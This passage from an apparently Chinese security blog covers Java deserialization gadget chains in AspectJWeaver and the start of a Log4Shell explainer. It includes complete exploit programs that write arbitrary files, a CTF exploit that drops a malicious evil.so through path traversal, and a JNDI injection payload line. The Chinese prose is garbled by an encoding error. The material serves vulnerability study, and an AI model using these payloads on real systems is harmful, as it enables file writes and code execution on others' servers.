class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åå°„è·å–æ„é€ å‡½æ•°</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap)con.newInstance(<span class="hljs-string">&quot;C:&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// è¿™é‡Œç”¨åˆ°ConstantTransformeræ˜¯ä¸ºäº†æ„é€ valueï¼Œå³å†™å…¥æ–‡ä»¶çš„å€¼</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-comment">// è¿”å›ä¸€ä¸ªLazyMapå¯¹è±¡</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,transform);<br>        <span class="hljs-comment">// åˆ©ç”¨TiedMapEntryå’ŒBadAttributeValueExpExceptionï¼Œä½¿ååºåˆ—åŒ–BadAttributeValueExpExceptionå¯¹è±¡çš„æ—¶å€™è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outmap,<span class="hljs-string">&quot;Users\\75279\\Desktop\\1.jsp&quot;</span>);<br>        <span class="hljs-comment">// è¿™é‡Œæ˜¯ä¸ºäº†åºåˆ—åŒ–æ—¶ä¸è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(out);<br>        oos.writeObject(poc);<br>        System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));<br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(out.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CC6æ”¹é“¾"><a href="#CC6æ”¹é“¾" class="headerlink" title="CC6æ”¹é“¾"></a>CC6æ”¹é“¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AJCC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åå°„è·å–æ„é€ å‡½æ•°</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap)con.newInstance(<span class="hljs-string">&quot;C:&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// è¿™é‡Œç”¨åˆ°ConstantTransformeræ˜¯ä¸ºäº†æ„é€ valueï¼Œå³å†™å…¥æ–‡ä»¶çš„å€¼</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-comment">// è¿”å›ä¸€ä¸ªLazyMapå¯¹è±¡</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,transform);<br>        <span class="hljs-comment">// åˆ©ç”¨TiedMapEntryå’ŒBadAttributeValueExpExceptionï¼Œä½¿ååºåˆ—åŒ–BadAttributeValueExpExceptionå¯¹è±¡çš„æ—¶å€™è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outmap,<span class="hljs-string">&quot;Users\\75279\\Desktop\\1.jsp&quot;</span>);<br>        <span class="hljs-comment">// è¿™é‡Œæ˜¯ä¸ºäº†åºåˆ—åŒ–æ—¶ä¸è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedmap, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(out);<br>        oos.writeObject(expMap);<br>        System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));<br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(out.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/09/AspectJWeaver/image-20240809210524825.png" alt="image-20240809210524825"></p><p>æœ€åè¡¥å……ä¸€ä¸‹å›½èµ›é‚£é“é¢˜ç”¨çš„<code>AspectJWeaver</code>å†™å…¥æ¶æ„soæ–‡ä»¶çš„EXPï¼Œå®Œæ•´åˆèµ›wpå¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18201664">CISCN2024-WEB-wp - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.example.jdbctest.bean.UserBean;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-comment">// è·å–æŒ‡å®šç±»çš„ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¹¶è®¾ç½®ä¸ºå¯è®¿é—®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; getCtor(<span class="hljs-keyword">final</span> String name) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> ctor;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªUserBeanå¯¹è±¡ï¼Œå°†evil.soçš„å†…å®¹Base64ç¼–ç åå­˜å…¥UserBeanä¸­</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;../../../../../../../../../../../../tmp/evil.so&quot;</span>; <span class="hljs-comment">// è·¯å¾„æŒ‡å‘/tmp/evil.so</span><br>        <span class="hljs-type">Path</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">&quot;F:\\CTF_Java\\CISCN2024\\src\\main\\java\\com\\eddiemurphy\\evil.so&quot;</span>); <span class="hljs-comment">// å‡è®¾evil.soä½äºå½“å‰ç›®å½•</span><br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(filePath); <span class="hljs-comment">// è¯»å–æ–‡ä»¶å­—èŠ‚</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes); <span class="hljs-comment">// å°†æ–‡ä»¶å†…å®¹Base64ç¼–ç </span><br>        <span class="hljs-type">UserBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserBean</span>(filename, content); <span class="hljs-comment">// åˆ›å»ºUserBeanå®ä¾‹</span><br>        Constructor&lt;?&gt; ctor = getCtor(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">simpleCache</span> <span class="hljs-operator">=</span> ctor.newInstance(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-number">12</span>); <span class="hljs-comment">// å®ä¾‹åŒ–ä¸€ä¸ªSimpleCacheå¯¹è±¡</span><br>        bean.setObj(simpleCache); <span class="hljs-comment">// å°†SimpleCacheå¯¹è±¡è®¾ç½®ä¸ºUserBeançš„objå±æ€§</span><br>        <span class="hljs-keyword">return</span> bean;<br>    &#125;<br><br>    <span class="hljs-comment">// åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡åˆ°å­—èŠ‚æ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(object);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">// ä¸»å‡½æ•°ï¼Œåºåˆ—åŒ–å¯¹è±¡å¹¶å°†å…¶å†™å…¥æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] serialized = serialize(getObject()); <span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\CISCN2024\\src\\main\\java\\com\\eddiemurphy\\output.ser&quot;</span>; <span class="hljs-comment">// è¾“å‡ºæ–‡ä»¶å</span><br><br>        <span class="hljs-comment">// ä½¿ç”¨FileOutputStreamå°†å­—èŠ‚æ•°æ®å†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fileName);<br>        fos.write(serialized);<br>        fos.close(); <span class="hljs-comment">// å…³é—­æ–‡ä»¶è¾“å‡ºæµ</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/aspectjweaver">AspectJWeaver | Java (gitbook.io)</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136595841">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹AspectJWeaverâ€”â€”ä»»æ„æ–‡ä»¶å†™å…¥-CSDNåšå®¢</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j</title>
    <link href="/2024/08/08/Log4j/"/>
    <url>/2024/08/08/Log4j/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Log4jæ¼æ´è¢«ç§°ä¸ºå¯è½½å…¥å²å†Œçš„é‡Œç¨‹ç¢‘å¼é¡¶çº§ä¾›åº”é“¾æ¼æ´ã€‚</p><p>2021å¹´åº•ï¼ŒLog4j æ¼æ´æ¨ªç©ºå‡ºä¸–ï¼Œåœ¨å®‰å…¨åœˆå¼•èµ·äº†è½©ç„¶å¤§æ³¢ï¼Œå¯ä»¥è¯´æ˜¯æ ¸å¼¹çº§åˆ«çš„æ¼æ´ï¼Œæ— è®ºæ˜¯æ¸—é€ã€ç ”å‘ã€å®‰æœã€ç ”ç©¶ï¼Œæ‰€æœ‰äººéƒ½åœ¨å­¦ä¹ å’Œå¤ç°è¿™ä¸ªæ¼æ´ï¼Œç”±äºå…¶è¦†ç›–é¢å¹¿ï¼Œå¼•ç”¨æ¬¡æ•°åºå¤§ï¼Œç›´æ¥æˆä¸ºå¯ä»¥ä¸æ°¸æ’ä¹‹è“é½åçš„é¡¶çº§å¯åˆ©ç”¨æ¼æ´ï¼Œå®˜æ–¹ CVSS è¯„åˆ†æ›´æ˜¯ç›´æ¥é¡¶åˆ° 10.0ï¼Œå›½å†…æœ‰å‚å•†å°†å…¶å‘½åä¸ºâ€œæ¯’æ—¥å¿—â€ï¼Œå›½å¤–å°†å…¶å‘½åä¸º Log4Shellã€‚</p><p>Apache log4j2æ˜¯ä¸€æ¬¾ç”¨äº Java æ—¥å¿—è®°å½•çš„å·¥å…·ã€‚æ—¥å¿—è®°å½•ä¸»è¦ç”¨æ¥ç›‘è§†ä»£ç ä¸­å˜é‡çš„å˜åŒ–æƒ…å†µï¼Œå‘¨æœŸæ€§åœ°è®°å½•åˆ°æ–‡ä»¶ä¸­ä¾›å…¶ä»–åº”ç”¨è¿›è¡Œç»Ÿè®¡åˆ†æå·¥ä½œï¼›è·Ÿè¸ªä»£ç è¿è¡Œæ—¶è½¨è¿¹ï¼Œä½œä¸ºæ—¥åå®¡è®¡çš„ä¾æ®ï¼›æ‹…å½“é›†æˆå¼€å‘ç¯å¢ƒä¸­çš„è°ƒè¯•å™¨çš„ä½œç”¨ï¼Œå‘æ–‡ä»¶æˆ–æ§åˆ¶å°æ‰“å°ä»£ç çš„è°ƒè¯•ä¿¡æ¯ã€‚å…¶åœ¨JAVAç”Ÿæ€ç¯å¢ƒä¸­åº”ç”¨æå…¶å¹¿æ³›,å½±å“å·¨å¤§ã€‚</p><p>æ¼æ´çš„è§¦å‘ç‚¹åœ¨äºåˆ©ç”¨<code>org.apache.logging.log4j.Logger</code>è¿›è¡Œ<code>log</code>æˆ–<code>error</code>ç­‰è®°å½•æ“ä½œæ—¶æœªå¯¹æ—¥å¿—messageä¿¡æ¯è¿›è¡Œæœ‰æ•ˆæ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´æ¼æ´å‘ç”Ÿï¼Œè§¦å‘ç‚¹æ˜¯JNDIã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼š<code>2.0 &lt;= Apache log4j2 &lt;= 2.14.1</code></p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>Add the dependencies listed below to your classpath.</p><blockquote><p>log4j-api.jar</p><p>log4j-core.jar</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4Vul</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">food</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;taco&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;&#123;&#125; is not served&quot;</span>, food);<br>        <span class="hljs-comment">// 12:17:56.859 [main] ERROR Log4Vul - taco is not served</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;&#125;</code>èµ·åˆ°å ä½ç¬¦çš„ä½œç”¨ï¼Œè¢«æ›¿æ¢ä¸ºä¼ å…¥çš„å‚æ•°</p><p><code>log4j</code>æä¾›äº†ä¸€äº›<code>lookup</code>åŠŸèƒ½ï¼Œå¯ä»¥å¿«é€Ÿæ‰“å°ç¯å¢ƒå˜é‡ã€javaç‰ˆæœ¬ä¿¡æ¯ã€æ—¥å¿—äº‹ä»¶ã€è¿è¡Œå®¹å™¨ä¿¡æ¯ç­‰å†…å®¹ã€‚</p><p>å¦‚<code>logger.error(&quot;Java version :&#123;&#125;&quot;,&quot;$&#123;java:version&#125;&quot;);</code>å°†æ‰“å°javaç‰ˆæœ¬</p><p>å…·ä½“å¯ä»¥æŸ¥çœ‹[å®˜æ–¹æ–‡æ¡£](<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4j â€“ Log4j 2 Lookups (apache.org)</a>)</p><p>å¯ä»¥çœ‹åˆ°æœ‰æ•æ„Ÿçš„<code>JndiLookup </code>ï¼Œé€šè¿‡jndiæ¥è·å–å˜é‡å€¼</p><p>åœ¨<code>log4j.core.lookup</code>å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">jndiName</span> <span class="hljs-operator">=</span> convertJndiName(key);<br>    <span class="hljs-keyword">try</span> (<span class="hljs-keyword">final</span> <span class="hljs-type">JndiManager</span> <span class="hljs-variable">jndiManager</span> <span class="hljs-operator">=</span> JndiManager.getDefaultManager()) &#123;<br>        <span class="hljs-keyword">return</span> Objects.toString(jndiManager.lookup(jndiName), <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>jndiManager#lookup</code>æœ‰ç†Ÿæ‚‰çš„<code>this.context.lookup(name);</code>ï¼Œ<code>context</code>é»˜è®¤ä¸º<code>InitialContext</code></p><p>æ¥ç€çœ‹çœ‹<code>log4j</code>æ˜¯æ€ä¹ˆå¤„ç†æˆ‘ä»¬ä¼ å…¥çš„messageå¹¶è½¬åŒ–ä¸ºjndiçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">MessagePatternConverter#format<br></code></pre></td></tr></table></figure><ul><li>åˆ¤æ–­æ˜¯å¦è®¾ç½®<code>noLookups</code>ï¼ˆåé¢è®²é˜²å¾¡å°±æ˜¯æŠŠè¿™ä¸ªå‚æ•°è®¾ä¸ºtrueï¼‰</li><li>åˆ¤æ–­æ˜¯å¦æœ‰<code>$&#123;</code></li><li>ä¼ å…¥<code>StrSubstitutor</code>è¿›è¡Œ<code>replace</code></li></ul><p><img src="/2024/08/08/Log4j/image-20240809190958652.png" alt="image-20240809190958652"></p><p>æŠŠ<code>$&#123;xxx&#125;</code>ä¸­é—´çš„å†…å®¹æå–å‡ºæ¥ï¼Œä¼ å…¥<code>resolveVariable</code>å¤„ç†ï¼Œåœ¨<code>Interpolator#lookup</code>ï¼ŒæŠŠç¬¬ä¸€ä¸ª<code>:</code>å‰çš„å†…å®¹æå–å‡ºæ¥ï¼Œè¿™é‡Œå°±æ˜¯<code>jndi</code>ï¼Œåœ¨<code>strLookupMap</code>æ‰¾åˆ°å¯¹åº”çš„<code>Lookup</code>ç±»ï¼Œå³æ‰¾åˆ°<code>JndiLookup</code>ç±»ï¼Œç”¨è¿™ä¸ªç±»å»<code>lookup</code>åé¢çš„éƒ¨åˆ†ã€‚</p><p><img src="/2024/08/08/Log4j/image-20240809191616225.png" alt="image-20240809191616225"></p><p>ä¸Šé¢æ˜¯ä½¿ç”¨<code>logger.error()</code>è§¦å‘çš„ï¼Œæ—¥å¿—ç­‰çº§é»˜è®¤200ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚<code>logger.log(Level.INFO, &quot;$&#123;jndi:ldap://127.0.0.1:8099/666&#125;&quot;);</code></p><p>ä¼šç»è¿‡<code>logIfEnabled()</code>çš„åˆ¤æ–­ã€‚</p><p><img src="/2024/08/08/Log4j/image-20240809191642961.png" alt="image-20240809191642961"></p><p>å¦‚æœæ—¥å¿—ç­‰çº§çš„å€¼æ²¡æœ‰å°äº200ï¼ˆå€¼è¶Šå°ç­‰çº§è¶Šé«˜ï¼‰ï¼Œå°±ä¸ä¼šè¿›å…¥<code>logMessage</code>æ¥æ‰“å°æ¶ˆæ¯ï¼š</p><p><img src="/2024/08/08/Log4j/image-20240809191719075.png" 